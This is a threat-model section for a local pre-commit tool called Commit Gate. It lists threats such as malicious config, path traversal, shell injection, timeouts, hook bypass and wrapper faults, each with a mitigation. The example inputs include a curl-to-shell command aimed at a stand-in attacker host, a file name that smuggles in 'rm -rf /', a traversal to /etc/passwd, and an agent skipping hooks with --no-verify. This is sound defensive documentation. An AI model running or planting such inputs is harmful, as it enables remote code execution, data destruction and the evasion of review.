# Security Considerations

## Threat Model

Commit Gate is a local developer tool. It runs on the developer's machine with the developer's permissions. The primary security concerns are about the tool not creating new attack surfaces, not about defending against a hostile environment.

### Threat: Arbitrary command execution via config
- **Vector:** An attacker commits a malicious `.commitgate.toml` with a command check like `command = "curl attacker.com/steal | sh"`
- **Impact:** Arbitrary code execution when any developer commits
- **Mitigation:** The gate executes whatever commands are in the config. This is by design — the config is committed to version control and subject to code review. The same risk exists for any `Makefile`, CI config, or git hook.
- **Residual risk:** Accepted. The config file is trusted the same way any committed script is trusted. Developers should review `.commitgate.toml` changes in PRs just as they review CI config changes.

### Threat: Path traversal in staged file paths
- **Vector:** A staged file with a path like `../../../etc/passwd` could cause the gate to read or reference files outside the repository
- **Impact:** Information disclosure or unexpected behaviour
- **Mitigation:** The gate normalises all paths relative to the repository root. Paths that escape the repository root are rejected. The `git diff --cached --name-only` output is already relative to the repo root.

### Threat: Shell injection via file names
- **Vector:** A staged file named `; rm -rf /; .rs` could lead to command injection when substituted into `{files}`
- **Impact:** Arbitrary command execution
- **Mitigation:** All file paths substituted into `{files}` templates must be shell-escaped. Use Rust's `shell-escape` crate or equivalent. Never concatenate raw file paths into shell commands.

### Threat: Denial of service via check timeout
- **Vector:** A command check hangs indefinitely (e.g. `command = "cat /dev/urandom"`)
- **Impact:** Developer's commit is blocked forever
- **Mitigation:** Per-check timeouts (configurable, with a default). Timed-out processes are killed with SIGKILL after a grace period.

### Threat: Sensitive data in check output
- **Vector:** A command check's output includes secrets (e.g. a test runner logging environment variables)
- **Impact:** Secrets appear in the gate's terminal output or JSON result
- **Mitigation:** The gate does not scrub output — it passes through what the external tool produces. This is the same as running the tool manually. Developers should ensure their tools do not log secrets. The output truncation limit reduces the surface area but does not eliminate it.

### Threat: Hook bypass via `git commit --no-verify`
- **Vector:** A developer (or agent) uses `git commit --no-verify` to bypass the pre-commit hook entirely
- **Impact:** The gate does not run; all checks are skipped; non-conforming code reaches git history
- **Mitigation:** None at the git hook layer — `--no-verify` is an intentional git escape hatch. Teams concerned about unverified commits should enforce checks redundantly in CI. For agent pipelines, the agent orchestrator should not pass `--no-verify` to git; if it does, the CI gate acts as a backstop. For environments where bypass is unacceptable, use the git-alias wrapper (Option B in T-07) or MCP tool (Option C) instead of hooks.
- **Residual risk:** Accepted for hook-based deployments. The gate is a developer feedback tool, not a security control. Any team that requires hard enforcement should deploy Option B or C and treat CI as the authoritative gate.

### Threat: Git alias wrapper infinite recursion
- **Vector:** The wrapper script resolves `git` via PATH, finds itself, and loops
- **Impact:** All git operations hang or fail with a stack overflow
- **Mitigation:** The wrapper must reference the real git binary by **absolute path** (e.g. `/usr/bin/git`), never via PATH lookup. The `commitgate install --alias` command (if it generates the wrapper) must validate that the absolute path points to a real git binary before writing the script.

### Threat: Gate bug blocks all commits via alias wrapper
- **Vector:** A software bug in the gate causes it to always exit non-zero, even for clean commits
- **Impact:** The alias wrapper blocks all commits in the affected environment; no code can be committed
- **Mitigation:** The wrapper should be tested before deployment. The gate's own test suite must include a test verifying that a clean, valid commit passes all checks. For recovery, the real git binary remains accessible as a fallback at its absolute path.

### Threat: MCP server executes `git commit` without gate validation
- **Vector:** A bug in the MCP server's `propose_commit` handler executes the commit before the pipeline completes or on a pipeline error
- **Impact:** Invalid commits reach git history despite the gate's intended enforcement
- **Mitigation:** The `propose_commit` handler must only call `git commit` after receiving an explicit `success: true` result from the pipeline. Any pipeline error (gate error, timeout) must result in an MCP error response, not a commit. This must be covered by integration tests.

## Security Properties

### The gate never writes to git
The gate reads the staging area and executes checks. It never calls `git add`, `git commit`, `git push`, `git reset`, or any other write operation. A bug in the gate cannot corrupt git history.

### The gate never reads credentials
The gate does not access `.git/config` for credentials, does not read SSH keys, and does not access any secret stores. It reads only `.commitgate.toml` and the staged file list/content via `git show`.

### The gate never makes network requests
The gate itself makes no network calls. Command checks may make network requests (e.g. `cargo test` downloading dependencies), but that is the external tool's behaviour, not the gate's.

### The gate logs nothing to disk
The gate writes output to stdout/stderr only. It does not create log files, temporary files, or any persistent state. There is nothing to clean up after a run.

### No credentials, API keys, or secrets in error output
The gate's own error messages contain only: file paths, check names, line numbers, pattern matches, command names, and configuration values. None of these should contain secrets. If they do, the developer has a more fundamental problem than the gate can solve.
